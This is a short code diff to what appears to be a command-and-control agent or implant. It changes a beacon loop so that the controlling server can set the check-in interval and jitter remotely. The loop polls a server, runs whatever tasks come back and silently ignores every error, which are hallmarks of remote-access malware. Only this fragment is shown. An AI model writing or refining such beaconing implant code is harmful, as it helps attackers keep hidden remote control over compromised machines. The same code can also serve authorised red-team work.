@@ -172,9 +172,13 @@ def execute_task(task):
 
 def beacon_loop():
     import random
+    _sleep = SLEEP
+    _jitter = JITTER
     while True:
         try:
             resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
+            _sleep = int(resp.get("sleep", _sleep))
+            _jitter = int(resp.get("jitter", _jitter))
             for task in resp.get("tasks", []):
                 try:
                     result = execute_task(task)
@@ -186,8 +190,8 @@ def beacon_loop():
                         pass
         except Exception:
             pass
-        jitter_s = SLEEP * JITTER / 100
-        time.sleep(max(1, SLEEP + random.uniform(-jitter_s, jitter_s)))
+        jitter_s = _sleep * _jitter / 100
+        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))
 
 if __name__ == "__main__":
     while True:
